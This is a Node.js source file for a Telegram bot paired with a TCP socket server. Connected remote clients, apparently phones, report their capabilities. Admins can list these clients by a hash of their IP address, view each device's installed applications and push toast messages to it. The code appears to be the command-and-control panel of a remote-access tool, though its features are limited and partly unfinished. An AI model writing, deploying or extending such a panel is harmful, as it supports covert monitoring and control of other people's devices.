const token  = "";
const chat   = 0;
const admins = [ 0, 0, 0 ];

const TelegramBot = require("node-telegram-bot-api");
const crypto = require("crypto");
const net = require("net");

const makeFont = (string) => {
    const translationMap = {
        'q': 'Q', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 'ꜱ', 'd': 'ᴅ', 'f': 'ꜰ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationMap[char] || char).join('');
}

function chunkArray(array, chunkSize) {
    const result = [];
    for (let i = 0; i < array.length; i += chunkSize) {
        const chunk = array.slice(i, i + chunkSize);
        result.push(chunk);
    }
    return result;
}

const bot = new TelegramBot(token, { polling: true })
const clients = [];
const jsclients = [];
const server = net.createServer(async (socket) => {
    socket.on("data", async (body) => {
        try{
            const data = JSON.parse(body);
            if (data.method == "connect"){
                if (!clients.includes(socket)){
                    clients.push(socket);
                    jsclients.push({
                        client: socket,
                        accessory: data.result,
                        hash: crypto.createHash("md5").update(socket.remoteAddress).digest('hex').slice(0, 8)
                    });
                }
            } else if (data.method == "getApplications"){
                let apps = data.result;
                let string = '';
                for (let app of apps){
                    string += makeFont(`📃 name: ${app.name}\n🎫 package: ${app.package}\n---------\n`);
                }
                try{
                    await bot.editMessageText(
                        `🥤 | اپلیکیشن های دانلود شده:\n${string}`,
                        {
                            chat_id: data.chat_id,
                            message_id: data.message_id
                        }
                    )
                } catch (e) {
                    await bot.sendMessage(data.chat_id, `🥤 | اپلیکیشن های دانلود شده:\n${string}`)
                }
            }
        } catch (e){
            console.log("🔴 Error:", e)
        }
    })

    socket.on("end", () => {
        console.log(`🔓 Client ${socket.remoteAddress} disconnected`);
        delete clients[clients.indexOf(socket)];
        let i = 0;
        for (let cli of jsclients){
            if (cli.client.remoteAddress == socket.remoteAddress){
                delete jsclients[i];
            } else {
                i += 1;
            }
        }
    })
})

server.listen(3000, "0.0.0.0", () => {
    console.log("✅ Socket-Server is online");
})

let objs = {
    first_name: null,
    bid: null
}

bot.getMe().then((b) => {
    objs.first_name = b.first_name;
    objs.bid = b.id
})

bot.on("message", async (msg) => {
    if (msg.chat.id == chat && admins.includes(msg.from.id)){
        if (msg.text.startsWith("/start")){
            await bot.sendMessage(
                msg.chat.id,
                makeFont(`🌊 | remote is online and active on `) + `<a href="tg://openmessage?user_id=${objs.bid}"></a>\n`,
                {
                    parse_mode: "HTML",
                    reply_to_message_id: msg.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: makeFont("users 👥"),
                                    callback_data: `getUsers_${msg.from.id}_0`
                                }
                            ]
                        ]
                    }
                }
            )
        } else if (msg.text.startsWith("/panel_")) {
            let chash = msg.text.slice(7).trim();
            if (chash === "") {
                await bot.sendMessage(msg.chat.id, makeFont(`❌ | no hash was found`), {
                    reply_to_message_id: msg.message_id
                });
            } else {
                for (let cli of jsclients) {
                    if (cli.hash === chash) {
                        let _str = `🔊 | selected user ${chash}\n🥤 | has ${cli.accessory.length} access`;
                        let layers = [[]]; // Start with one empty layer
                        let layer_index = 0;
        
                        for (let access of cli.accessory) {
                            if (layers[layer_index].length === 3) {
                                layer_index++;
                                layers[layer_index] = []; // Create a new layer
                            }
                            switch (access) {
                                case "getApplication":
                                    layers[layer_index].push({
                                        text: makeFont("apps 📪"),
                                        callback_data: `getApps_${msg.from.id}_${chash}`
                                    });
                                    break;
                                case "sendToast":
                                    layers[layer_index].push({
                                        text: makeFont("toast 📦"),
                                        callback_data: `sendToast_${msg.from.id}_${chash}`
                                    });
                                    break;
                            }
                        }
        
                        // Add close button
                        layers[layer_index].push({
                            text: makeFont("close"),
                            callback_data: `close_${msg.from.id}`
                        });
        
                        await bot.sendMessage(msg.chat.id, _str, {
                            reply_to_message_id: msg.message_id,
                            reply_markup: {
                                inline_keyboard: layers
                            }
                        });
                        return;
                    }
                }
            }
        }
    }
})

bot.on('callback_query', async (call) => {
    let spl = call.data.split("_");
    let uid = parseInt(spl[1]);
    if (admins.includes(call.from.id)){
        if (uid == call.from.id){
            if (call.data.startsWith("getUsers")){
                let pid = parseInt(spl[2]);
                let clis = chunkArray(jsclients, 5);
                let str = makeFont(`📃 | page ${clis.length != 0 ? pid+1 : 0}/${clis.length}\n👥 | users are ${jsclients.length}`);
                if (clis.length != 0){
                    for (let cli of clis[pid]){
                        str += `\n\n👤 | <code>/panel_${cli.hash}</code>\n` + makeFont(`➕ | has ${cli.accessory.length} access`);
                    }
                }
                
                let fLayer = [];

                if (pid != 0){
                    fLayer.push({
                        text: makeFont("⏮ previous"),
                        callback_data: `getUsers_${call.from.id}_${pid-1}`
                    })
                }

                if (!(pid+1 >= clis.length)){
                    fLayer.push({
                        text: makeFont("next ⏭"),
                        callback_data: `getUsers_${call.from.id}_${pid+1}`
                    })
                }

                await bot.editMessageText(
                    str,
                    {
                        chat_id: call.message.chat.id,
                        message_id: call.message.message_id,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                fLayer,
                                [
                                    {
                                        text: makeFont('close'),
                                        callback_data: `close_${call.from.id}`
                                    }
                                ]
                            ]
                        }
                    }
                )
            } else if (call.data.startsWith("close")){
                try{await bot.deleteMessage(call.message.chat.id, call.message.message_id);}
                catch (e){}
            } else if (call.data.startsWith("getApps")){
                let chash = spl[2];
                await bot.editMessageText(
                    makeFont("🚧 | apps: ..."),
                    {
                        chat_id: call.message.chat.id,
                        message_id: call.message.message_id,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: makeFont("close"),
                                        callback_data: `close_${call.from.id}`
                                    },
                                    {
                                        text: makeFont("back"),
                                        callback_data: `back_${call.from.id}_${chash}`
                                    }
                                ]
                            ]
                        }
                    }
                )
            } else if (call.data.startsWith("back")){
                let chash = spl[2];
                for (let cli of jsclients){
                    if (cli.hash == chash){
                        let _str = `🔊 | selected user ${chash}\n🥤 | has ${cli.accessory.length} access`;
                        let layers = [];
                        let layer_index = 0;
                        for (let access of cli.accessory){
                            if (layers.length == 0){layers.push([]);}
                            switch (access){
                                case "getApplication":
                                    if (layers[layer_index].length !== 3){
                                        layers.splice(layer_index, 0, [])
                                        layers[layer_index].push({
                                            text: makeFont("apps 📪"),
                                            callback_data: `getApps_${call.from.id}_${chash}`
                                        })
                                    } else {
                                        layers.push([]);
                                        layer_index += 1;
                                        layers[layer_index].push({
                                            text: makeFont("apps 📪"),
                                            callback_data: `getApps_${call.from.id}_${chash}`
                                        })
                                    }
                                    break;
                                
                                case "sendToast":
                                    if (layers[layer_index].length !== 3){
                                        layers.splice(layer_index, 0, [])
                                        layers[layer_index].push({
                                            text: makeFont("toast 📦"),
                                            callback_data: `sendToast_${call.from.id}_${chash}`
                                        })
                                    } else {
                                        layers.push([]);
                                        layer_index += 1;
                                        layers[layer_index].push({
                                            text: makeFont("toast 📦"),
                                            callback_data: `sendToast_${call.from.id}_${chash}`
                                        })
                                    }
                                    break;
                            }
                        }
                        if (layers[layers.length - 1] == []){
                            layers[layers.length - 1].push({
                                text: makeFont("close"),
                                callback_data: `close_${call.from.id}`
                            })
                        } else {
                            layers.push([]);
                            layers[layers.length - 1].push({
                                text: makeFont("close"),
                                callback_data: `close_${call.from.id}`
                            })
                        }
                        
                        await bot.editMessageText(_str, {
                            message_id: call.message.message_id,
                            chat_id: call.message.chat.id,
                            reply_markup: {
                                inline_keyboard: layers
                            }
                        })
                        return;
                    }
                }
            }
        }
    }
})